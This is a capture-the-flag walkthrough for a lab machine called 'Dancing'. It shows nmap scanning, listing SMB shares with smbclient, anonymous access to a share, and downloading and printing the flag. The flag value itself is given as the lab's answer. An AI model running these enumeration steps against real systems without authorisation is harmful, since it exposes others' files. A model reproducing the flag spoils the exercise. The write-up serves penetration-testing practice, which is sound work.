# Dancing Machine Walkthrough

## Summary

This document details the enumeration and exploitation steps taken to retrieve the flag from the `Dancing` machine (IP: `10.129.110.208`). The process involved network scanning, SMB enumeration, and file extraction.

---

## 1. Nmap Scan

First, a comprehensive Nmap scan was performed to identify open ports and running services.

Bash

```
nmap -Pn -sV -sC -vv 10.129.110.208 -oN nmap.txt
```

**Key Findings:**

- **135/tcp** - Microsoft Windows RPC
- **139/tcp** - Microsoft Windows netbios-ssn
- **445/tcp** - Microsoft-ds (SMB)
- **5985/tcp** - Microsoft HTTPAPI httpd 2.0

<details> <summary>Click to expand Nmap output</summary>

text

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? 
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

</details>

---

## 2. Enumerate SMB Shares

Next, enumerate available SMB shares using `smbclient`:

Bash

```
smbclient -L \\\\10.129.110.208\\
```

**Discovered Shares:**

- `ADMIN$`
- `C$`
- `IPC$`
- `WorkShares`

---

## 3. Access the WorkShares Share

Connect to the `WorkShares` share:

Bash

```
smbclient \\\\10.129.110.208\\WorkShares
```

List the contents:

Bash

```
smb: \> ls
```

**Output:**

text

```
  Amy.J       D
  James.P     D
```

---

## 4. Locate and Retrieve the Flag

Navigate to the `James.P` directory and list its contents:

Bash

```
smb: \> cd James.P
smb: \James.P\> ls
```

**Output:**

text

```
  flag.txt    
```

Download the flag:

Bash

```
smb: \James.P\> get flag.txt
```

---

## 5. Read the Flag

Verify the flag was downloaded and display its contents:

Bash

```
ls
cat flag.txt
```

**Flag:**

text

```
5f61c10dffbc77a704d76016a22f1664
```

---

## Conclusion

- **Initial Access:** Enumerated SMB shares and found an accessible share.
- **Privilege Escalation:** Navigated to a user directory and found the flag.
- **Flag:** `5f61c10dffbc77a704d76016a22f1664`
